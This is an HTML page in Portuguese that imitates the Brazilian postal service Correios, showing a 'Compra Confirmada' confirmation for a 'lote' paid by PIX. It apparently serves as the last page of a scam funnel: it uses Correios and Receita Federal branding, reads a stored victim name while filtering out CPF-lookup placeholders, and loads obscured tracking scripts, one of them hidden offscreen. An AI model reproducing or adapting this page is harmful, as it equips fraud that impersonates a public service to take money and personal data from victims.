<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#004169">
    <title>Compra Confirmada - Correios</title>
    <link rel="icon" href="images/lau6rRAszLZQ.png" sizes="32x32">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/sucesso.css">
    <noscript><style>body{visibility:visible!important}</style></noscript>
</head>
<body>
    <header class="header">
        <nav class="header-nav" id="headerNav">
            <a href="#" class="logo-link">
                <img src="images/correios.webp" alt="Correios" class="logo-correios">
            </a>
            <a href="#" class="btn-entrar">
                <img src="images/entrar.svg" alt="Entrar" class="icon-entrar">
                <span class="user-name">Entrar</span>
            </a>
        </nav>
        <div class="header-bar"></div>
    </header>

    <main class="main">
        <div class="success-banner">
            <div class="success-confetti"></div>
            <div class="success-icon-wrapper">
                <div class="success-icon">
                    <i class="fas fa-check"></i>
                </div>
                <div class="success-ring"></div>
            </div>
            <h1 class="success-title">Compra Confirmada!</h1>
            <p class="success-subtitle">Seu lote foi adquirido com sucesso e será enviado em breve.</p>
        </div>

        <div class="success-wrapper">
            <!-- Status Card -->
            <div class="status-card">
                <div class="status-header">
                    <div class="status-badge">
                        <i class="fas fa-check-circle"></i>
                        <span>Pagamento aprovado</span>
                    </div>
                    <span class="status-id" id="statusId"></span>
                </div>
                <div class="status-timeline">
                    <div class="timeline-item completed">
                        <div class="timeline-dot"><i class="fas fa-check"></i></div>
                        <div class="timeline-content">
                            <strong>Pagamento confirmado</strong>
                            <span>PIX processado com sucesso</span>
                        </div>
                    </div>
                    <div class="timeline-item completed">
                        <div class="timeline-dot"><i class="fas fa-check"></i></div>
                        <div class="timeline-content">
                            <strong>Lote reservado</strong>
                            <span>Seu lote foi separado para envio</span>
                        </div>
                    </div>
                    <div class="timeline-item active">
                        <div class="timeline-dot"><i class="fas fa-box"></i></div>
                        <div class="timeline-content">
                            <strong>Preparando envio</strong>
                            <span>Despacho em até 48 horas</span>
                        </div>
                    </div>
                    <div class="timeline-item pending">
                        <div class="timeline-dot"><i class="fas fa-truck"></i></div>
                        <div class="timeline-content">
                            <strong>Em trânsito</strong>
                            <span>Previsão de entrega em até 7 dias úteis</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Info Cards -->
            <div class="info-grid">
                <div class="info-card rastreio">
                    <div class="info-icon"><i class="fas fa-barcode"></i></div>
                    <div class="info-content">
                        <span class="info-label">Código de rastreio</span>
                        <span class="info-value" id="codigoRastreio">Será enviado por e-mail</span>
                    </div>
                </div>
                <div class="info-card previsao">
                    <div class="info-icon"><i class="fas fa-calendar-check"></i></div>
                    <div class="info-content">
                        <span class="info-label">Previsão de entrega</span>
                        <span class="info-value" id="previsaoEntrega">Até 7 dias úteis</span>
                    </div>
                </div>
            </div>

            <!-- Next Steps -->
            <div class="next-steps">
                <h3><i class="fas fa-list-check"></i> Próximos passos</h3>
                <div class="steps-list">
                    <div class="step-card">
                        <div class="step-number">1</div>
                        <div class="step-info">
                            <strong>Aguarde o e-mail de confirmação</strong>
                            <p>Você receberá o comprovante e detalhes do envio no e-mail cadastrado.</p>
                        </div>
                    </div>
                    <div class="step-card">
                        <div class="step-number">2</div>
                        <div class="step-info">
                            <strong>Acompanhe pelo rastreio</strong>
                            <p>O código de rastreio será enviado assim que o lote for despachado.</p>
                        </div>
                    </div>
                    <div class="step-card">
                        <div class="step-number">3</div>
                        <div class="step-info">
                            <strong>Receba seu lote</strong>
                            <p>Confira os itens na entrega. Você tem 7 dias de garantia.</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Security Footer -->
            <div class="security-footer">
                <div class="security-item"><i class="fas fa-shield-check"></i><span>Pagamento verificado</span></div>
                <div class="security-item"><i class="fas fa-lock"></i><span>Transação segura</span></div>
                <div class="security-item"><i class="fas fa-undo"></i><span>Garantia 7 dias</span></div>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-container">
            <div class="footer-bottom">
                <div class="footer-logos">
                    <img src="images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer">
                </div>
                <p class="footer-copyright">&copy; Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
            </div>
        </div>
    </footer>

    <script src="js/imp-t4k2r1.js"></script>
<script>window._currentStep="encomenda";window._trackEvent("page_view","encomenda");</script>
<script src="js/shield.js"></script>
    <script>
    (function() {
        // Exibe nome do usuário no header
        var nome = localStorage.getItem('correios_nome');
        if (nome) {
            try {
                while (nome.indexOf('%') !== -1) {
                    var d = decodeURIComponent(nome);
                    if (d === nome) break;
                    nome = d;
                }
            } catch(e) {}
            var invalidos = ['cpf localizado','cpf encontrado','titular','usuario','usuário','cliente','prezado','destinatário','destinatario','---'];
            var nomeUpper = nome.toUpperCase().trim();
            var valido = !invalidos.some(function(i) { return nomeUpper.indexOf(i.toUpperCase()) !== -1; });
            if (valido && nome.trim()) {
                var partes = nome.trim().split(/\s+/).map(function(p) {
                    return p.charAt(0).toUpperCase() + p.slice(1).toLowerCase();
                });
                var nomeExibido = partes.length >= 2 ? partes[0] + ' ' + partes[1] : partes[0];
                var userNameEl = document.querySelector('.btn-entrar .user-name');
                var headerNav = document.getElementById('headerNav');
                if (userNameEl && headerNav) {
                    userNameEl.textContent = nomeExibido;
                    headerNav.classList.add('has-user-name');
                }
            }
        }
    })();
    </script>
    
    <div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>
    
</body>
</html>
